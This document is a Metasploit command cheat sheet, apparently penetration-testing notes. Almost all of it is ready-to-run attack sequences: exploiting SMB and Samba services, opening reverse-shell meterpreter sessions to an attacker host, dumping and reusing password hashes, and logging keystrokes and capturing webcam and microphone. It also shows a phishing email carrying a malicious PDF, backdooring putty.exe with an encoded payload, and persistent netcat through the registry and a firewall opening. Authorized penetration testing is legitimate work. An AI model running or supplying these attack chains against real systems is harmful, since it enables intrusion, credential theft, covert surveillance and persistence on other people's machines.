# Metasploit

## Metasploit Notes

Singles are payloads that are self-contained and completely standalone. Stagers setup a network connection between the attacker and victim and are designed to be small and reliable. Stages are payload components that are downloaded by Stagers modules.

## Metasploit Basics

Run exploit in one command:

```text
msfconsole -x "use exploit/multi/samba/usermap_script; set RHOST 172.16.194.172; set PAYLOAD cmd/unix/reverse; set LHOST 172.16.194.163; run"
```

Obtain information on an exploit:

```text
msf > info exploit/windows/smb/ms09_050_smb2_negotiate_func_index
```

Search for content:

```text
msf > search usermap_script
```

Adding Target Range

```text
msf > set RHOSTS 10.10.10.0/24
msf > set RHOSTS 10.10.10.1-10.10.10.255
```

Logging Session

```text
msf > set SessionLogging true [logging all information typed into all interactive sessions (command shell or Meterpreter) on exploited target systems.]
msf > set ConsoleLogging true [Session Logging user's home directory, in the ~/.msf4/logs directory]
```

Narrow down to a platform:

```text
msf > search platform:aix
```

Determine what operating system is vulnerable to a particular exploit:

```text
msf  exploit(ms08_067_netapi) > show targets
```

Download file from and execute on remote machine:

```text
meterpreter > download c:\\boot.ini
meterpreter > execute -f cmd.exe -i -H
```

Dump Hashes from Remote Machine:

```text
meterpreter > run post/windows/gather/hashdump
```

## Metasploit - More specific scans and targeted attacks

Check to see if a target is exploitable w/o exploiting the machine:

```text
msf > use exploit/multi/samba/ms08_067_netapi
msf > set RHOST 172.16.194.134
msf > set RPORT 445
msf > show options
msf > check
```

Port Scanning:

```text
msf > use auxiliary/scanner/portscan/syn
msf auxiliary(syn) > show options
msf auxiliary(syn) > set INTERFACE eth0
msf auxiliary(syn) > set PORTS 80
msf auxiliary(syn) > set RHOSTS 192.168.1.0/24
msf auxiliary(syn) > set THREADS 50
msf auxiliary(syn) > run
```

SMB Scan:

```text
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
msf auxiliary(smb_version) > set THREADS 11
msf auxiliary(smb_version) > run
```

Search and exploit MSSQL:

```text
msf > search mssql
msf > use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > set RHOSTS 10.211.55.1/24
msf auxiliary(mssql_ping) > exploit

msf auxiliary(mssql_login) > use auxiliary/admin/mssql/mssql_exec
msf auxiliary(mssql_exec) > show options
msf auxiliary(mssql_exec) > set RHOST 10.211.55.128
msf auxiliary(mssql_exec) > set MSSQL_PASS password
msf auxiliary(mssql_exec) > set CMD net user bacon ihazpassword /ADD
msf auxiliary(mssql_exec) > exploit
```

SSH SERVICE Scan:

```text
msf > services -p 22 -c name,port,proto
msf > use auxiliary/scanner/ssh/ssh_version
msf  auxiliary(ssh_version) > set RHOSTS 172.16.194.163 172.16.194.172
msf  auxiliary(ssh_version) > run
```

FTP Service Scan:

```text
msf > services -p 21 -c name,proto
msf > use auxiliary/scanner/ftp/ftp_version
msf  auxiliary(ftp_version) > set RHOSTS 172.16.194.172
msf  auxiliary(ftp_version) > run
```

PASSWORD SNIFFING WITH METASPLOIT:

```text
msf > use auxiliary/sniffer/psnuffle
msf auxiliary(psnuffle) > run
```

SNMP Scan:

```text
msf >  search snmp
msf >  use auxiliary/scanner/snmp/snmp_login
msf auxiliary(snmp_login) >  show options
msf auxiliary(snmp_login) >  set RHOSTS 192.168.0.0-192.168.5.255
msf auxiliary(snmp_login) >  set THREADS 10
msf auxiliary(snmp_login) >  run
```

PSexec Exploit:

```text
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.1.100
msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.1.5
msf exploit(psexec) > set LPORT 4444
msf exploit(psexec) > set SMBUSER victim
msf exploit(psexec) > set SMBPASS s3cr3t
msf exploit(psexec) > exploit
```

VNC Exploit:

```text
msf auxiliary(vnc_none_auth) > use auxiliary/scanner/vnc/vnc_none_auth
msf auxiliary(vnc_none_auth) > show options
msf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.0/24
msf auxiliary(vnc_none_auth) > set THREADS 50
msf auxiliary(vnc_none_auth) > run
```

Various Helpful Meterpreter Commands:

```text
meterpreter >getpid
meterpreter >getuid
meterpreter >execute -f
meterpreter >kill 3152
meterpreter >shell
meterpreter >dir
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
meterpreter > webcam_list
meterpreter >webcam_snap
meterpreter >record_mic
meterpreter >hashdump
meterpreter >loadsniffer
```

Nessus - Import Results:

```text
msf > db_import /root/Nessus/nessus_scan.nbe
msf > hosts
msf > services 172.16.194.172
msf > vulns -p 139
msf > vulns -p 22
msf > search cve:2010-2075
msf  exploit(unreal_ircd_3281_backdoor) > exploit
```

Running Nessus from within MSF:

```text
msf > load nessus
msf > nessus_connect dook:s3cr3t@192.168.1.100
msf > nessus_policy_list
msf > nessus_scan_new
msf > nessus_scan_status
msf > nessus_report_list
msf > nessus_report_get
msf > nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
msf > hosts -c address,vulns
```

Client Side Exploits:

```text
msf > use exploit/windows/fileformat/adobe_utilprintf
msf exploit(adobe_utilprintf) > set FILENAME BestComputers-UpgradeInstructions.pdf
msf exploit(adobe_utilprintf) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(adobe_utilprintf) > set LHOST 192.168.8.128
msf exploit(adobe_utilprintf) > set LPORT 4455
msf exploit(adobe_utilprintf) > show options
msf exploit(adobe_utilprintf) > exploit
```

We will use msfconsole to set up our multi handler listener.

```text
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 4455
msf exploit(handler) > set LHOST 192.168.8.128
msf exploit(handler) > exploit
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
eterpreter > ps
meterpreter > run post/windows/manage/migrate
meterpreter > sysinfo
meterpreter > use priv
meterpreter > run post/windows/capture/keylog_recorder
root@kali:~# cat /root/.msf4/loot/20110323091836_default_192.168.1.195_host.windows.key_832155.txt
```

PTH Attack:

```text
meterpreter > run post/windows/gather/hashdump
msf > search psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.57.133
msf exploit(psexec) > set LPORT 443
msf exploit(psexec) > set RHOST 192.168.57.131
msf exploit(psexec) > show options
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b75
msf exploit(psexec) > exploit
meterpreter > shell
```

Incognito: TIP: File servers are virtual treasure troves of tokens since most file servers are used as network attached drives via domain logon scripts

```text
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 10.211.55.162
msf exploit(ms08_067_netapi) > set LANG english
msf exploit(ms08_067_netapi) > show targets
msf exploit(ms08_067_netapi) > set TARGET 8
msf exploit(ms08_067_netapi) > exploit
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token SNEAKS.IN\\Administrator
meterpreter > getuid
meterpreter > shell
meterpreter > whoami
```

Persistent Netcat:

```text
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows
meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
meterpreter > execute -f cmd -i
C:\Documents and Settings\Jim\My Documents > netsh firewall show opmode
C:\Documents and Settings\Jim\My Documents > netsh firewall add portopening TCP 455 "Service Firewall"
C:\Documents and Settings\Jim\My Documents > netsh firewall show portopening
root@kali:~# nc -v 172.16.104.128 455
```

Enabling Remote Desktop:

```text
meterpreter > run getgui -h
meterpreter > run getgui -u hacker -p s3cr3t
meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
```

MSF JTR:

```text
msf auxiliary(handler) > use post/windows/gather/hashdump
msf post(hashdump) > set session 1
msf post(hashdump) > run
msf post(hashdump) > use auxiliary/analyze/jtr_crack_fast
msf auxiliary(jtr_crack_fast) > run
```

Backdoor an EXE \(putty\)

```text
root@kali:/var/www# wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
root@kali:/var/www# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 3 -t exe -x /var/www/putty.exe -o /var/www/puttyx.exe
```

Backdoor an EXE \(putty\) - setup reverse connection:

```text
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.101
msf exploit(handler) > set LPORT 443
msf exploit(handler) > exploit
meterpreter > getuid
```

MSF PtH:

```text
cd /opt/metasploit-4.11/
./app/msfconsole
msf > use exploit/windows/smb/psexec
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(psexec) > set RHOST 10.10.10.10
msf exploit(psexec) > set LHOST [YourLinuxIPaddr]
msf exploit(psexec) > set SMBUser monk
msf exploit(psexec) > set SMBPass [LANMAN]:[NT]
msf exploit(psexec) > exploit
meterpreter > getuid
meterpreter > getpid
meterpreter > ifconfig
meterpreter > shell
```

